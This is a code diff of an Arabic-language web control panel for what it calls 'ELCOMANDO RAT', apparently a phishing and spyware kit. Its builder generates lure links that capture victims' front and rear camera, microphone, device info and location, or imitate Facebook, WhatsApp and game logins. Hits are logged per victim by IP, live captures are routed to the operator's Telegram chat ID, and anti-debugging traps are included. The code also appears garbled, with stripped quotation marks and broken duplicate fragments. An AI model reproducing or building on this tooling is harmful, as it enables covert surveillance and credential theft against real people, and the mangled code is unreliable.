@@ -10,7 +10,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Noto+Kufi+Arabic:wght@400;700&display=swap');
+        @import url( https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Noto+Kufi+Arabic:wght@400;700&display=swap );
         
         :root {
             --primary: #00f2ff;
@@ -20,18 +20,15 @@
             --admin-red: #ff1a1a;
         }
 
-        body, html { margin: 0; padding: 0; background: var(--bg); color: white; font-family: 'Noto Kufi Arabic', sans-serif; overflow: hidden; height: 100vh; }
+        body, html { margin: 0; padding: 0; background: var(--bg); color: white; font-family:  Noto Kufi Arabic , sans-serif; overflow: hidden; height: 100vh; }
 
-        /* شريط إشعارات الإدارة */
         #admin-broadcast {
             display: none; background: linear-gradient(90deg, var(--admin-red), #8b0000);
             color: white; padding: 10px; text-align: center; font-size: 11px;
-            position: fixed; top: 65px; width: 100%; z-index: 999;
-            box-shadow: 0 5px 15px rgba(255, 26, 26, 0.3); animation: slideDown 0.5s ease;
+            position: fixed; top: 0; width: 100%; z-index: 1001;
+            box-shadow: 0 5px 15px rgba(255, 26, 26, 0.3);
         }
-        @keyframes slideDown { from { transform: translateY(-100%); } to { transform: translateY(0); } }
 
-        /* لودر التنقل */
         #page-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.95); z-index: 9999;
@@ -40,7 +37,6 @@
         .spinning-emoji { font-size: 70px; animation: rotate 1s infinite linear; filter: drop-shadow(0 0 15px var(--primary)); }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-        /* الديلوج الموحد */
         .custom-dialog-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
@@ -50,11 +46,10 @@
             width: 85%; max-width: 320px; background: #0a0a0a;
             border: 2px solid var(--primary); border-radius: 20px;
             padding: 25px; text-align: center; box-shadow: var(--neon-glow);
-            animation: zoomIn 0.3s ease;
         }
 
         .header { height: 65px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; }
-        .header h1 { font-family: 'Orbitron'; font-size: 16px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin: 0; flex: 1; }
+        .header h1 { font-family:  Orbitron ; font-size: 16px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin: 0; flex: 1; }
 
         .viewport { margin-top: 75px; height: calc(100vh - 165px); overflow-y: auto; padding: 15px; }
         .page { display: none; }
@@ -67,50 +62,28 @@
             padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.3s;
         }
         
-        .btn-neon {
-            background: transparent; color: var(--primary); border: 2px solid var(--primary);
-            box-shadow: 0 0 10px var(--primary); animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse { 0% { box-shadow: 0 0 5px var(--primary); } 50% { box-shadow: 0 0 20px var(--primary); } 100% { box-shadow: 0 0 5px var(--primary); } }
-
         input, select { width: 100%; background: #000; border: 1px solid var(--primary); padding: 14px; border-radius: 10px; color: white; margin-bottom: 10px; text-align: center; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; background: var(--primary); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .btn { width: 100%; background: var(--primary); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; }
 
         .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 90px; background: #000; border-top: 2px solid var(--primary); display: flex; align-items: center; justify-content: space-around; z-index: 1000; }
-        .nav-item { color: #444; text-align: center; flex: 1; transition: 0.3s; font-size: 10px; }
+        .nav-item { color: #444; text-align: center; flex: 1; font-size: 10px; cursor: pointer; }
         .nav-item i { font-size: 20px; margin-bottom: 5px; }
         .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
     </style>
 </head>
 <body>
 
-    <div id="admin-broadcast">
-        <i class="fas fa-bullhorn"></i> <span id="broadcast-text"></span>
-    </div>
+    <div id="admin-broadcast"><i class="fas fa-bullhorn"></i> <span id="broadcast-text"></span></div>
 
     <div id="page-loader">
-        <div class="spinning-emoji" id="loader-icon">⚙️</div>
-        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">Elcomando & Princess...</p>
-    </div>
-
-    <div id="acc-dialog" class="custom-dialog-overlay">
-        <div class="custom-dialog-box">
-            <div class="dialog-icon">🎉</div>
-            <h3 style="color:var(--primary); font-family:Orbitron;">ACCOUNT READY</h3>
-            <div onclick="copyInfo(this, 'Username')" class="tool-card" style="margin:10px 0; border:1px dashed var(--primary)">
-                <small>User:</small> <b style="color:var(--primary)" id="res-u"></b>
-            </div>
-            <div onclick="copyInfo(this, 'Password')" class="tool-card" style="margin:10px 0; border:1px dashed var(--primary)">
-                <small>Pass:</small> <b style="color:var(--primary)" id="res-p"></b>
-            </div>
-            <button class="btn" onclick="closeAccDialog()">دخول للنظام 🚀</button>
-        </div>
+        <div class="spinning-emoji">⚙️</div>
+        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">AUTHENTICATING...</p>
     </div>
 
     <div id="custom-alert" class="custom-dialog-overlay">
         <div class="custom-dialog-box">
             <div id="alert-icon" style="font-size:40px; margin-bottom:10px;">⚠️</div>
-            <h3 id="alert-title" style="color: var(--primary); font-family: Orbitron;">SYSTEM-CMD</h3>
+            <h3 id="alert-title" style="color: var(--primary); font-family: Orbitron;">SYSTEM</h3>
             <p id="alert-msg" style="font-size: 14px; color: #ccc;"></p>
             <button class="btn" onclick="closeAlert()">فهمت 👍</button>
         </div>
@@ -118,25 +91,25 @@
 
     <div id="auth-screen" style="height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;">
         <div class="tool-card" style="width: 100%; max-width: 350px; border-right: none; border-top: 4px solid var(--primary);">
-            <i class="fas fa-skull fa-3x" style="color:var(--primary); filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 15px;"></i>
+            <i class="fas fa-skull fa-3x" style="color:var(--primary); margin-bottom: 15px;"></i>
             <div id="login-box">
                 <input type="text" id="loginUser" placeholder="Username">
                 <input type="password" id="loginPass" placeholder="Password">
-                <button class="btn" onclick="handleAuth('login')">LOGIN SYSTEM 🔓</button>
+                <button class="btn" onclick="handleAuth( login )">LOGIN 🔓</button>
                 <p onclick="toggleAuth(true)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">CREATE ACCOUNT</p>
             </div>
             <div id="signup-box" style="display: none;">
                 <input type="text" id="regUser" placeholder="New Username">
                 <input type="password" id="regPass" placeholder="New Password">
-                <button class="btn" onclick="handleAuth('signup')">SIGN UP 🛠️</button>
-                <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">HAVE ACCOUNT? LOGIN</p>
+                <button class="btn" onclick="handleAuth( signup )">SIGN UP 🛠️</button>
+                <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">HAVE ACCOUNT?</p>
             </div>
         </div>
     </div>
 
     <div id="main-panel" style="display: none;">
         <header class="header">
-            <h1 id="title">Elcomando & Princess</h1>
+            <h1 id="title">ELCOMANDO RAT</h1>
             <i class="fas fa-ghost" style="color: var(--primary);"></i>
         </header>
 
@@ -146,54 +119,44 @@
             </div>
 
             <div id="tool-details-page" class="page">
-                <div class="tool-card" style="height: 250px; overflow-y: auto; text-align: right; border-color: var(--primary);" id="victim-list">
-                    <p style="color: #444; text-align: center; margin-top: 100px;">Waiting for hits... ☠️</p>
-                </div>
+                <div class="tool-card" style="height: 250px; overflow-y: auto; text-align: right;" id="victim-list"></div>
                 <div style="margin-top: 20px; text-align: center;">
-                    <p id="tool-link-display" style="font-size: 10px; color: var(--primary); word-break: break-all; margin-bottom: 10px;"></p>
-                    <button class="btn btn-neon" id="copy-tool-btn">Welcome TO WORLD CMD🎁</button>
-                    <button class="btn" style="margin-top: 10px; background: #222; color: #fff;" onclick="nav(1, 'LINKS', '🔗', null)">BACK 🔙</button>
+                    <p id="tool-link-display" style="font-size: 10px; color: var(--primary); word-break: break-all;"></p>
+                    <button class="btn" id="copy-tool-btn">COPY TOOL LINK 📋</button>
+                    <button class="btn" style="margin-top:10px; background:#222; color:#fff;" onclick="nav(1,  TOOLS ,  🔗 , null)">BACK</button>
                 </div>
             </div>
 
             <div id="tab2" class="page">
-                <div class="tool-card" style="border-right:none; border-bottom: 3px solid var(--primary);">
-                    <h3 style="font-family: Orbitron;">BUILDER SYSTEM</h3>
+                <div class="tool-card">
+                    <h3>BUILDER</h3>
                     <select id="tool-select"></select>
-                    <input type="text" id="victim-name" placeholder="Victim Name (Optional)">
-                    <button class="btn btn-neon" onclick="generateCustomLink()">GENERATE 🚀</button>
-                    <div id="generated-result" style="display:none; margin-top:15px; padding:10px; border:1px dashed var(--primary); font-size:10px; word-break: break-all;">
-                        <span id="final-link"></span><br><br>
-                        <button class="btn" style="padding:5px" onclick="copyGeneratedLink()">COPY 📋</button>
+                    <input type="text" id="victim-name" placeholder="Victim Name">
+                    <button class="btn" onclick="generateCustomLink()">GENERATE 🚀</button>
+                    <div id="generated-result" style="display:none; margin-top:15px; padding:10px; border:1px dashed var(--primary);">
+                        <span id="final-link" style="font-size:10px;"></span><br><br>
+                        <button class="btn" onclick="copyGeneratedLink()">COPY 📋</button>
                     </div>
                 </div>
             </div>
 
             <div id="tab3" class="page">
-                <div class="tool-card" style="border-right:none; border-left: 4px solid var(--admin-red);">
-                    <h3 style="color: var(--admin-red); font-family: Orbitron;">LIVE LOGS 🔔</h3>
-                    <div id="notifs-list" style="max-height: 400px; overflow-y: auto; font-size: 12px; text-align: left;">
-                        <p style="color: #444;">No new alerts.</p>
-                    </div>
-                </div>
+                <div class="tool-card" id="notifs-list">No logs available.</div>
             </div>
 
             <div id="tab4" class="page">
-                <div class="tool-card" style="text-align: right;">
-                    <small style="color: #666;">CLIENT:</small>
-                    <h2 id="set-username" style="margin: 0; color: var(--primary);">User</h2>
-                    <br>
-                    <button class="btn" onclick="showAlert('SUCCESS', 'System Updated ✅')">REFRESH 🔄</button>
-                    <button class="btn" style="background: var(--admin-red); margin-top: 10px;" onclick="logout()">LOGOUT 🚪</button>
+                <div class="tool-card">
+                    <h2 id="set-username" style="color: var(--primary);">User</h2>
+                    <button class="btn" style="background: var(--admin-red);" onclick="logout()">LOGOUT 🚪</button>
                 </div>
             </div>
         </div>
 
         <nav class="bottom-nav">
-            <div class="nav-item active" onclick="nav(1, 'Elcomando & Princess', '🔗', this)"><i class="fas fa-link"></i><br><span>TOOLS</span></div>
-            <div class="nav-item" onclick="nav(2, 'Elcomando & Princess', '🛠️', this)"><i class="fas fa-hammer"></i><br><span>BUILDER</span></div>
-            <div class="nav-item" onclick="nav(3, 'Elcomando & Princess', '🔔', this)"><i class="fas fa-bell"></i><br><span>LOGS</span></div>
-            <div class="nav-item" onclick="nav(4, 'PROFILE', '⚙️', this)"><i class="fas fa-user-shield"></i><br><span>PROFILE</span></div>
+            <div class="nav-item active" onclick="nav(1,  TOOLS ,  🔗 , this)"><i class="fas fa-link"></i><br>TOOLS</div>
+            <div class="nav-item" onclick="nav(2,  BUILDER ,  🛠️ , this)"><i class="fas fa-hammer"></i><br>BUILDER</div>
+            <div class="nav-item" onclick="nav(3,  LOGS ,  🔔 , this)"><i class="fas fa-bell"></i><br>LOGS</div>
+            <div class="nav-item" onclick="nav(4,  PROFILE ,  ⚙️ , this)"><i class="fas fa-user-shield"></i><br>PROFILE</div>
         </nav>
     </div>
 
@@ -203,325 +166,173 @@
         const db = firebase.database();
 
         const tools = [
-    { name: "كاميرا امامي", value: "fcam", icon: "fas fa-camera" },
-    { name: "كاميرا خلفي", value: "rcam", icon: "fas fa-video" },
-    { name: "كاميرا مع صوت", value: "vcam", icon: "fas fa-microphone" },
-    { name: "فيد خلفي", value: "rvid", icon: "fas fa-film" },
-    { name: "فيد امامي", value: "fvid", icon: "fas fa-video-slash" },
-    { name: "معلومات هاتف", value: "info", icon: "fas fa-mobile-alt" },
-    { name: "موقع", value: "loc", icon: "fas fa-map-marker-alt" },
-    { name: "Facebook", value: "fb", icon: "fab fa-facebook" },
-    { name: "Instagram", value: "inst", icon: "fab fa-instagram" },
-    { name: "TikTok", value: "tk", icon: "fab fa-tiktok" },
-    { name: "Snapchat", value: "snap", icon: "fab fa-snapchat" },
-    { name: "WhatsApp", value: "wa", icon: "fab fa-whatsapp" },
-    { name: "PUBG", value: "pubg", icon: "fas fa-gamepad" },
-    { name: "FreeFire", value: "ff", icon: "fas fa-fire" }
-];
+            { name: "كاميرا امامي", value: "fcam", icon: "fas fa-camera" },
+            { name: "كاميرا خلفي", value: "rcam", icon: "fas fa-video" },
+            { name: "كاميرا مع صوت", value: "vcam", icon: "fas fa-microphone" },
+            { name: "معلومات هاتف", value: "info", icon: "fas fa-mobile-alt" },
+            { name: "موقع", value: "loc", icon: "fas fa-map-marker-alt" },
+            { name: "Facebook", value: "fb", icon: "fab fa-facebook" },
+            { name: "WhatsApp", value: "wa", icon: "fab fa-whatsapp" }
+        ];
 
-
-        // 1. نظام الدخول والاستماع للرسائل
+        // --- نظام الحسابات والدخول ---
         async function handleAuth(type) {
-            const loader = document.getElementById('page-loader');
-            if(type === 'signup') {
-                const u = document.getElementById('regUser').value.trim();
-                const p = document.getElementById('regPass').value.trim();
-                if(!u || !p) return showAlert("ERROR", "Fill all fields");
-                
-                loader.style.display = 'flex';
-                await db.ref('users/' + u).set({ password: p, username: u, private_msg: "" });
-                // تفعيل كل الصلاحيات افتراضياً عند التسجيل (اختياري)
-                const defaultPerms = {}; tools.forEach(t => defaultPerms[t] = true);
-                await db.ref('permissions/' + u).set(defaultPerms);
+            const u = (type ===  signup  ? document.getElementById( regUser ) : document.getElementById( loginUser )).value.trim();
+            const p = (type ===  signup  ? document.getElementById( regPass ) : document.getElementById( loginPass )).value.trim();
+            if(!u || !p) return showAlert("⚠️", "يرجى ملء البيانات");
 
-                loader.style.display = 'none';
-                document.getElementById('res-u').innerText = u;
-                document.getElementById('res-p').innerText = p;
-                document.getElementById('acc-dialog').style.display = 'flex';
+            document.getElementById( page-loader ).style.display =  flex ;
+            const snap = await db.ref( users/  + u).once( value );
+
+            if(type ===  signup ) {
+                if(snap.exists()) { showAlert("❌", "المستخدم موجود بالفعل"); }
+                else {
+                    await db.ref( users/  + u).set({ password: p, status:  active , private_msg: { text: "", seen: true } });
+                    showAlert("✅", "تم إنشاء الحساب، يمكنك الدخول");
+                    toggleAuth(false);
+                }
             } else {
-                const u = document.getElementById('loginUser').value.trim();
-                const p = document.getElementById('loginPass').value.trim();
-                loader.style.display = 'flex';
-                const snap = await db.ref('users/' + u).once('value');
                 if(snap.exists() && snap.val().password === p) {
-                    localStorage.setItem('logged_user', u);
+                    localStorage.setItem( logged_user , u);
                     enterSystem();
-                } else { showAlert("DENIED", "Invalid credentials 🚫"); }
-                loader.style.display = 'none';
+                } else { showAlert("🚫", "بيانات خاطئة"); }
             }
+            document.getElementById( page-loader ).style.display =  none ;
         }
 
-        function listenToAdmin() {
-            const user = localStorage.getItem('logged_user');
-            // استقبال الرسائل العامة
-            db.ref('global_notifications').on('value', snap => {
-                if(snap.exists()) {
-                    document.getElementById('broadcast-text').innerText = snap.val().text;
-                    document.getElementById('admin-broadcast').style.display = 'block';
-                }
-            });
-            // استقبال الرسائل الخاصة
-            db.ref('users/' + user + '/private_msg').on('value', snap => {
-                if(snap.exists() && snap.val() !== "") {
-                    showAlert("ADMIN MESSAGE 📩", snap.val());
-                    db.ref('users/' + user + '/private_msg').set(""); // مسح بعد القراءة
-                }
-            });
+        // --- دخول النظام وتشغيل الرادارات ---
+        function enterSystem() {
+            const user = localStorage.getItem( logged_user );
+            if(!user) return;
+
+            document.getElementById( auth-screen ).style.display =  none ;
+            document.getElementById( main-panel ).style.display =  block ;
+            document.getElementById( set-username ).innerText = user;
+
+            initGrid();
+            checkBanStatus(user);
+            watchPrivateMessages(user);
+            listenToGlobalBroadcast();
         }
 
-        // 2. نظام الروابط والتحكم في الصلاحيات
         function initGrid() {
-    const grid = document.getElementById('main-grid');
-    const select = document.getElementById('tool-select');
-    grid.innerHTML = ""; 
-    select.innerHTML = "";
-    
-    tools.forEach(t => {
-        // عرض الكروت في الصفحة الرئيسية
-        grid.innerHTML += `
-            <div class="tool-card" onclick="openToolPage('${t.value}')">
-                <i class="${t.icon}" style="font-size:24px; color:var(--primary); margin-bottom:8px;"></i><br>
-                <span>${t.name}</span>
-            </div>`;
-        
-        // تعبئة القائمة في المنشئ (Builder)
-        select.innerHTML += `<option value="${t.value}">${t.name}</option>`;
-    });
-}
+            const grid = document.getElementById( main-grid );
+            const select = document.getElementById( tool-select );
+            grid.innerHTML = ""; select.innerHTML = "";
+            tools.forEach(t => {
+                grid.innerHTML += `<div class="tool-card" onclick="openToolPage( ${t.value} )"><i class="${t.icon}"></i><br>${t.name}</div>`;
+                select.innerHTML += `<option value="${t.value}">${t.name}</option>`;
+            });
+        }
 
+        // --- رادارات الأمان والرسائل ---
+        function checkBanStatus(u) {
+            db.ref( users/  + u +  /status ).on( value , snap => {
+                if(snap.val() ===  banned ) {
+                    alert("🚫 تم حظرك من المنصة");
+                    logout();
+                }
+            });
+        }
+
+        function watchPrivateMessages(u) {
+            db.ref( users/  + u +  /private_msg ).on( value , snap => {
+                if(snap.exists() && !snap.val().seen) {
+                    showAlert("📩 رسالة خاصة", snap.val().text);
+                    db.ref( users/  + u +  /private_msg/seen ).set(true);
+                }
+            });
+        }
+
+        function listenToGlobalBroadcast() {
+            db.ref( global_notifications ).on( value , snap => {
+                const bar = document.getElementById( admin-broadcast );
+                if(snap.exists()) {
+                    document.getElementById( broadcast-text ).innerText = snap.val().text;
+                    bar.style.display =  block ;
+                } else { bar.style.display =  none ; }
+            });
+        }
+
+        // --- وظائف الأدوات والمنشئ ---
+        async function openToolPage(val) {
+            const user = localStorage.getItem( logged_user );
+            const baseUrl = window.location.origin;
+            const link = `${baseUrl}/${val}.html?user_id=${user}`;
             
-            // فحص الصلاحية من الأدمن
-            const permSnap = await db.ref('permissions/' + user + '/' + name).once('value');
-            if(permSnap.val() === false) {
-                return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق من قبل الإدارة لحسابك.");
-            }
-
-            const link = ${window.location.origin}/${name}.html?user_id=${user};
-            document.getElementById('copy-tool-btn').onclick = () => {
+            document.getElementById( tool-link-display ).innerText = link;
+            document.getElementById( copy-tool-btn ).onclick = () => {
                 navigator.clipboard.writeText(link);
-                showAlert("COPIED", "Link copied to clipboard ✅");
+                showAlert("✅", "تم نسخ رابط الأداة");
             };
-            nav('tool', name, '⚙️', null);
-            loadVictims(name, user);
+
+            const toolName = tools.find(t => t.value === val).name;
+            nav( tool , toolName,  ⚙️ , null);
+            loadVictims(val, user);
         }
 
         function loadVictims(tool, user) {
-            db.ref('hits/' + user + '/' + tool).on('value', snap => {
-                const list = document.getElementById('victim-list');
-                list.innerHTML = "";
-                if(!snap.exists()) list.innerHTML = "<p style='text-align:center; margin-top:100px;'>No victims found.</p>";
-                snap.forEach(child => {
-                    const d = child.val();
-                    list.innerHTML += `<div style="padding:10px; border-bottom:1px solid #222; font-size:11px; text-align:left;">📡 IP: ${d.ip || 'Unknown'}<br>⏰ ${d.time || ''}</div>`;
+            db.ref( hits/  + user +  /  + tool).on( value , snap => {
+                const list = document.getElementById( victim-list );
+                list.innerHTML = snap.exists() ? "" : "No victims yet.";
+                snap.forEach(c => {
+                    list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px;">📡 IP: ${c.val().ip} | ${c.val().time}</div>`;
                 });
             });
         }
 
-        // 3. المنشئ والإشعارات
-        // التعديل الجديد للمنشئ ليدعم الـ Chat ID في الأدوات الحية
-function generateCustomLink() {
-    const tool = document.getElementById('tool-select').value;
-    const vict = document.getElementById('victim-name').value || "target";
-    const user = localStorage.getItem('logged_user');
-    
-    // قائمة القيم البرمجية للأدوات التي تحتاج تليجرام
-    const liveValues = ["fcam", "rcam", "vcam", "rvid", "fvid", "info", "loc"];
-    
-    let finalId = user;
-
-    if (liveValues.includes(tool)) {
-        const telegramId = prompt("هذه الأداة (LIVE) تتطلب Chat ID التليجرام الخاص بك لاستلام البيانات فوراً:");
-        
-        if (!telegramId || isNaN(telegramId)) {
-            showAlert("تنبيه ⚠️", "يجب إدخال معرف تليجرام (أرقام فقط).");
-            return;
-        }
-        finalId = telegramId;
-    }
-
-    const baseUrl = window.location.origin; 
-    const link = `${baseUrl}/${tool}.html?user_id=${finalId}&target=${vict}`;
-    
-    document.getElementById('final-link').innerText = link;
-    document.getElementById('generated-result').style.display = 'block';
-}
-
-
-const baseUrl = window.location.origin; 
-const toolValue = document.getElementById('tool-select').value;
-const link = `${baseUrl}/${toolValue}.html?user_id=${finalId}&target=${vict}`;
-
-    
-    document.getElementById('final-link').innerText = link;
-    document.getElementById('generated-result').style.display = 'block';
-}
-
-
-        // التنقل والدوال العامة
-        async function openToolPage(toolValue) {
-    const user = localStorage.getItem('logged_user');
-    
-    // فحص الصلاحية من قاعدة البيانات
-    const permSnap = await db.ref('permissions/' + user + '/' + toolValue).once('value');
-    if(permSnap.val() === false) {
-        return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق من قبل الإدارة لحسابك.");
-    }
-
-    // إنشاء الرابط ديناميكياً حسب موقع الرفع
-    const baseUrl = window.location.origin;
-    const link = `${baseUrl}/${toolValue}.html?user_id=${user}`;
-    
-    document.getElementById('tool-link-display').innerText = link;
-    document.getElementById('copy-tool-btn').onclick = () => {
-        navigator.clipboard.writeText(link);
-        showAlert("COPIED", "Link copied to clipboard ✅");
-    };
-
-    // البحث عن اسم الأداة لعرضه في العنوان
-    const toolObj = tools.find(t => t.value === toolValue);
-    nav('tool', toolObj.name, '⚙️', null);
-    loadVictims(toolValue, user);
-}
-
-
-    // الكود الأصلي للتنقل
-    if(el) {
-        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-        el.classList.add('active');
-    }
-    const loader = document.getElementById('page-loader');
-    document.getElementById('loader-icon').innerText = emoji;
-    loader.style.display = 'flex';
-    setTimeout(() => {
-        loader.style.display = 'none';
-        document.getElementById('title').innerText = title;
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        const target = id === 'tool' ? 'tool-details-page' : 'tab' + id;
-        document.getElementById(target).classList.add('active');
-    }, 800);
-}
-
-
-        // --- 1. دالة فحص الحظر اللحظي ---
-function checkBanStatus(userId) {
-    db.ref('users/' + userId).on('value', snap => {
-        const userData = snap.val();
-        if (userData && userData.status === 'banned') {
-            alert("⚠️ تم حظر حسابك من قبل الإدارة لا يمكنك استخدام المنصة.");
-            localStorage.clear(); 
-            location.reload();    
-        }
-    });
-}
-
-// --- 2. دالة مراقبة الرسائل الخاصة ---
-function watchPrivateMessages(userId) {
-    db.ref('users/' + userId + '/private_msg').on('value', snap => {
-        if (snap.exists()) {
-            const msgData = snap.val();
-            if (!msgData.seen) {
-                showAlert("📩 رسالة خاصة من الإدارة", msgData.text);
-                // تحديث الحالة لـ "مقروءة"
-                db.ref('users/' + userId + '/private_msg').update({ seen: true });
+        function generateCustomLink() {
+            const tool = document.getElementById( tool-select ).value;
+            const vict = document.getElementById( victim-name ).value || "target";
+            const user = localStorage.getItem( logged_user );
+            const liveTools = ["fcam", "rcam", "vcam", "loc", "info"];
+            
+            let finalId = user;
+            if(liveTools.includes(tool)) {
+                const tid = prompt("أدخل Chat ID التليجرام:");
+                if(!tid) return;
+                finalId = tid;
             }
+
+            const link = `${window.location.origin}/${tool}.html?user_id=${finalId}&target=${vict}`;
+            document.getElementById( final-link ).innerText = link;
+            document.getElementById( generated-result ).style.display =  block ;
         }
-    });
-}
 
-// --- 3. دالة الدخول الرئيسية (المعدلة) ---
-function enterSystem() {
-    const user = localStorage.getItem('logged_user');
-    
-    if (user) {
-        // تشغيل الرادارات فور الدخول
-        checkBanStatus(user);
-        watchPrivateMessages(user);
-        
-        // إظهار اللوحة وإخفاء شاشة الدخول
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('main-panel').style.display = 'block';
-        document.getElementById('set-username').innerText = user;
-        
-        // تشغيل باقي مهام النظام
-        initGrid();
-        listenToAdmin();
-        startNotificationWatcher();
-    }
-}
-
-// --- 4. مراقبة الرسائل العامة (البث) ---
-db.ref('global_notifications').on('value', snap => {
-    const bar = document.getElementById('admin-broadcast');
-    if(snap.exists()) {
-        document.getElementById('broadcast-text').innerText = snap.val().text;
-        bar.style.display = 'block';
-    } else {
-        bar.style.display = 'none';
-    }
-});
-
-
-        function showAlert(title, msg) {
-            document.getElementById('alert-title').innerText = title;
-            document.getElementById('alert-msg').innerText = msg;
-            document.getElementById('custom-alert').style.display = 'flex';
+        // --- دوال عامة ---
+        function nav(id, title, emoji, el) {
+            if(el) {
+                document.querySelectorAll( .nav-item ).forEach(n => n.classList.remove( active ));
+                el.classList.add( active );
+            }
+            document.querySelectorAll( .page ).forEach(p => p.classList.remove( active ));
+            const target = id ===  tool  ?  tool-details-page  :  tab  + id;
+            document.getElementById(target).classList.add( active );
+            document.getElementById( title ).innerText = title;
         }
-        function closeAlert() { document.getElementById('custom-alert').style.display = 'none'; }
-        function copyInfo(el, type) {
-            navigator.clipboard.writeText(el.querySelector('b').innerText);
-            showAlert("COPIED", type + " copied!");
+
+        function showAlert(t, m) {
+            document.getElementById( alert-title ).innerText = t;
+            document.getElementById( alert-msg ).innerText = m;
+            document.getElementById( custom-alert ).style.display =  flex ;
         }
+        function closeAlert() { document.getElementById( custom-alert ).style.display =  none ; }
         function toggleAuth(s) {
-            document.getElementById('login-box').style.display = s ? 'none' : 'block';
-            document.getElementById('signup-box').style.display = s ? 'block' : 'none';
+            document.getElementById( login-box ).style.display = s ?  none  :  block ;
+            document.getElementById( signup-box ).style.display = s ?  block  :  none ;
         }
-        function closeAccDialog() { document.getElementById('acc-dialog').style.display = 'none'; toggleAuth(false); }
         function logout() { localStorage.clear(); location.reload(); }
-        window.onload = () => { if(localStorage.getItem('logged_user')) enterSystem(); };
-        
-function copyGeneratedLink() {
-    const linkText = document.getElementById('final-link').innerText;
-    if (!linkText) return;
+        function copyGeneratedLink() {
+            navigator.clipboard.writeText(document.getElementById( final-link ).innerText);
+            showAlert("✅", "تم النسخ بنجاح");
+        }
 
-    navigator.clipboard.writeText(linkText).then(() => {
-        const copyBtn = event.currentTarget;
-        const originalHTML = copyBtn.innerHTML;
-        
-        copyBtn.innerHTML = 'COPIED ✅';
-        copyBtn.style.color = '#00ff00';
-        
-        setTimeout(() => {
-            copyBtn.innerHTML = originalHTML;
-            copyBtn.style.color = 'var(--primary)';
-        }, 2000);
-    });
-}
+        window.onload = () => { if(localStorage.getItem( logged_user )) enterSystem(); };
 
-function startNotificationWatcher() {
-    console.log("Notification system active...");
-    // يمكنك هنا إضافة كود تنبيه بالصوت عند وصول ضحية جديدة إذا أردت
-}
-
-
-        
-        
-       // فخ بسيط لإغلاق الصفحة إذا تم فتح أدوات المطور
-setInterval(function() {
-    const before = new Date().getTime();
-    debugger; // سيتوقف الكود هنا إذا كان الـ Console مفتوحاً
-    const after = new Date().getTime();
-    if (after - before > 100) {
-        window.location.href = "about:blank"; // توجيه لصفحة فارغة
-    }
-}, 1000);
-
-// كود بسيط يمنع كليك يمين وفحص العناصر بشكل مبدئي
-document.oncontextmenu = () => false;
-document.onkeydown = (e) => {
-    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false;
-};
-
-
+        // حماية بسيطة
+        document.oncontextmenu = () => false;
+        document.onkeydown = e => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
     </script>
 </body>
 </html>
+
